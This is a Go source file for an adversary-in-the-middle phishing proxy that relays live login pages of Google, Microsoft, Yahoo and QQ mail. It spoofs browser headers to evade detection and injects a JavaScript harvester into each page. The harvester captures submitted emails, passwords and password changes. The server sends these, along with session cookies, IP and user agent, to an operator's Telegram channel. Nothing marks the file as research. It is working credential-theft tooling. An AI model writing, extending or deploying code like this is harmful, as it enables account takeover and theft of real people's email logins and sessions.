package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
)

// SessionStore holds active sessions safely
type SessionStore struct {
	mu       sync.RWMutex
	sessions map[string]*SessionData
}

type SessionData struct {
	Cookies   map[string]string
	UserEmail string
}

var store = &SessionStore{
	sessions: make(map[string]*SessionData),
}

// HarvesterScript is injected into every fetched page
const harvesterScript = `
<script>
// 1. Monitor Form Submissions for Credentials
document.addEventListener('submit', function(e) {
    const form = e.target;
    const formData = new FormData(form);
    const params = new URLSearchParams();
    let hasEmail = false;
    let hasPassword = false;

    for (let [key, value] of formData.entries()) {
        params.append(key, value);
        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user')) {
            window._capturedEmail = value;
            hasEmail = true;
        }
        if (key.toLowerCase().includes('pass')) {
            window._capturedPass = value;
            hasPassword = true;
        }
    }

    // If it looks like a login form, capture it
    if (hasEmail && hasPassword) {
        fetch('/api/harvest', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: params.toString()
        }).catch(() => {});
    }
}, true);

// 2. Monitor Password Changes Post-Login
setInterval(() => {
    const inputs = document.querySelectorAll('input[type="password"]');
    if (inputs.length >= 2) {
        const oldP = inputs[0].value;
        const newP = inputs[1].value;
        // Only send if both fields are filled (likely a change password form)
        if (oldP && newP) {
            fetch('/api/harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({type: 'pass_change', old: oldP, new: newP})
            }).catch(() => {});
        }
    }
}, 2000);

// 3. Spoof URL Visually
window.history.replaceState({}, '', window.location.href.replace(/\\/your-domain\\.com/, '\\/target-domain'));
</script>
`

func StartProxy(cfg TelegramConfig, listenPort string) {
	r := gin.Default()

	// Serve the Loader Bridge
	r.GET("/loader.html", func(c *gin.Context) {
		c.File("./loader.html")
	})

	// Default Route: Redirect to Loader
	r.GET("/", func(c *gin.Context) {
		c.Redirect(http.StatusMovedPermanently, "/loader.html")
	})

	// Main Proxy Route: Handles #hash requests
	// We use a specific pattern to avoid conflict with the catch-all later
	r.GET("/:hash", func(c *gin.Context) {
		hash := c.Param("hash")
		if !strings.HasPrefix(hash, "#") {
			hash = "#" + hash
		}

		email := strings.TrimPrefix(hash, "#")
		targetBase := GetTargetDomain(email)

		log.Printf("[PROXY] Fetching live page for %s from %s", email, targetBase)

		// Create HTTP Client for Proxy (Disable HTTP/2 to bypass fingerprinting)
		proxyClient := &http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse // Stop redirects, we handle them manually
			},
			Transport: &http.Transport{
				ForceAttemptHTTP2: false, // CRITICAL: Google blocks default Go HTTP/2 requests
			},
		}

		// Initial Fetch
		req, err := http.NewRequest("GET", targetBase, nil)
		if err != nil {
			c.String(500, "Error creating request")
			return
		}

		// SPOOFING HEADERS: Make Go look exactly like Chrome on Windows
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Sec-Ch-Ua", `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`)
		req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
		req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
		req.Header.Set("Sec-Fetch-Dest", "document")
		req.Header.Set("Sec-Fetch-Mode", "navigate")
		req.Header.Set("Sec-Fetch-Site", "none")
		req.Header.Set("Sec-Fetch-User", "?1")
		req.Header.Set("Upgrade-Insecure-Requests", "1")

		resp, err := proxyClient.Do(req)
		if err != nil {
			c.String(502, "Target Unavailable")
			return
		}
		defer resp.Body.Close()

		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			c.String(502, "Error reading body")
			return
		}

		bodyStr := string(bodyBytes)

		// --- CONTENT REWRITING ---

		// Replace target domain with our domain in links/scripts
		rewrittenBody := strings.ReplaceAll(bodyStr, targetBase, c.Request.Host+"/")

		// FIXED: Added check to prevent "index out of range" panic if there is no "@" symbol
		if strings.Contains(email, "@") {
			rewrittenBody = strings.ReplaceAll(rewrittenBody, "https://"+strings.Split(email, "@")[1], c.Request.Host+"/")
		}

		// Force relative links to route through the proxy correctly
		baseTag := `<base href="` + targetBase + `">`
		rewrittenBody = strings.Replace(rewrittenBody, "<head>", "<head>\n"+baseTag, 1)

		// Inject Harvester Script before </body>
		rewrittenBody = strings.Replace(rewrittenBody, "</body>", harvesterScript+"</body>", 1)

		// --- HEADER CLONING ---
		CloneHeaders(resp, c.Writer)

		// Handle Set-Cookie specifically to bind session
		setCookieHeader := resp.Header.Get("Set-Cookie")
		if setCookieHeader != "" {
			// Parse the cookie name/value from the raw header
			parts := strings.Split(setCookieHeader, "=")
			if len(parts) >= 2 {
				cookieName := strings.TrimSpace(strings.Split(parts[0], ";")[0])
				cookieValue := strings.Join(parts[1:], "=")

				// Set the cookie in the user's browser
				c.SetCookie(cookieName, cookieValue, 3600*24, "/", "", false, false)

				// Log the harvest
				SendTelegramMessage(cfg, FormatCookieHarvest(email, []string{setCookieHeader}))
			}
		}

		c.Writer.WriteHeader(resp.StatusCode)
		c.Writer.Write([]byte(rewrittenBody))
	})

	// API Endpoint for JS Harvester
	r.POST("/api/harvest", func(c *gin.Context) {
		contentType := c.ContentType()

		if contentType == "application/json" {
			var payload map[string]interface{}
			c.ShouldBindJSON(&payload)

			if t, ok := payload["type"].(string); ok && t == "pass_change" {
				old := payload["old"].(string)
				new := payload["new"].(string)
				SendTelegramMessage(cfg, FormatPasswordChange(old, new, "UnknownUser"))
			}
		} else {
			// Form Data (Login/Credentials)
			c.Request.ParseForm()
			email := c.PostForm("email")
			password := c.PostForm("password")

			if email == "" {
				email = c.PostForm("username")
			}
			if password == "" {
				password = c.PostForm("passwd")
			}

			ip := c.ClientIP()
			userAgent := c.GetHeader("User-Agent")

			SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, userAgent))
		}
		c.JSON(200, gin.H{"status": "ok"})
	})

	// Transparent Proxy for Post-Auth Requests (Inbox, Settings, etc.)
	// Use /proxy/* to avoid conflict with /:hash
	r.Any("/proxy/*filepath", func(c *gin.Context) {
		filepath := c.Param("filepath")
		if filepath == "" {
			filepath = "/"
		}
		// Remove leading slash if present to avoid double slashes
		filepath = strings.TrimPrefix(filepath, "/")

		// Determine Target Domain from Referer or Default
		referer := c.GetHeader("Referer")
		targetDomain := "https://accounts.google.com/" // Default

		if strings.Contains(referer, "gmail.com") {
			targetDomain = "https://accounts.google.com/"
		} else if strings.Contains(referer, "live.com") || strings.Contains(referer, "outlook.com") {
			targetDomain = "https://login.live.com/"
		} else if strings.Contains(referer, "qq.com") {
			targetDomain = "https://mail.qq.com/"
		} else if strings.Contains(referer, "yahoo.com") {
			targetDomain = "https://login.yahoo.com/"
		}

		fullURL := targetDomain + filepath

		// Create Outgoing Request
		outReq, _ := http.NewRequest(c.Request.Method, fullURL, c.Request.Body)

		// Copy Headers
		for key, values := range c.Request.Header {
			for _, value := range values {
				outReq.Header.Add(key, value)
			}
		}

		proxyClient := &http.Client{}
		resp, err := proxyClient.Do(outReq)
		if err != nil {
			c.String(502, "Upstream Error")
			return
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)

		// Rewrite Links again for nested pages
		rewrittenBody := strings.ReplaceAll(string(body), targetDomain, c.Request.Host+"/")

		CloneHeaders(resp, c.Writer)
		c.Writer.WriteHeader(resp.StatusCode)
		c.Writer.Write([]byte(rewrittenBody))
	})

	log.Printf("🚀 Chameleon Proxy listening on 0.0.0.0:%s", listenPort)
	// FIXED: Bound to 0.0.0.0 so Render can route traffic to it
	r.Run("0.0.0.0:" + listenPort)
}

func (s *SessionStore) AddSession(userAgent string, data *SessionData) string {
	id := fmt.Sprintf("%x", time.Now().UnixNano())
	s.mu.Lock()
	defer s.mu.Unlock()
	s.sessions[id] = data
	return id
}

func (s *SessionStore) GetSession(id string) (*SessionData, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	data, ok := s.sessions[id]
	return data, ok
}
